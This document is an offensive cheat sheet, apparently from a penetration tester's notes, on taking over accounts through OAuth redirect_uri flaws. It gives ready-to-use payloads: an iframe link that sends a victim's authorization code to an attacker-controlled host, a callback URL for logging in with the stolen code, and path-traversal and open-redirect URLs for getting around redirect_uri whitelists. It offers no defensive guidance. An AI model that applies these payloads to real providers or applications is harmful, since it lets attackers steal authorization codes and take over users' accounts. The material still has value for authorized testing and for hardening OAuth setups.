# Basic
- The user redirects back to the redirect_uri with an access token

# Provider Vulnerability
- Trick a victim to open a malicious link with manipulated `redirect_uri` parameter to get the victim code before he is used.
- Provider checker function for `redirect_uri` should not be Fixed (be Dynamic) to be vulnerable.
- Malicious link
  ```bash
  <iframe src="https://[PROVIDER.net]/auth?client_id=[APPLICATION-CLIENT-ID]&redirect_uri=[https://cvefix.ir]&response_type=code&scope=openid%20profile%20email"></iframe>
  ```
- Login to application with victim code
  ```bash
  https://[TARGET.tld]/oauth-callback?code=[STOLEN-CODE]
  ```

# Application vulnerability
- Find an Open Redirect in the application, then use it for manipulating `redirect_uri` parameter to bypass the whitelist URL.
- Dynamic URL  →  `https://site.com/oauth/callback/?.*`
- Valid URLs
  ```bash
  https://site.com/oauth/callback/../../
  https://site.com/oauth/callback/../../test_path                    # hidden path
  https://site.com/oauth/callback/../../test_path?test_param=test    # hidden path + hidden parameter
  ```
- Malicious link
  ```bash
  ....redirect_url=https://site.com/oauth/callback/../../user/profile?next=https://cvefix.ir
  ```

# Resource 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration
- https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
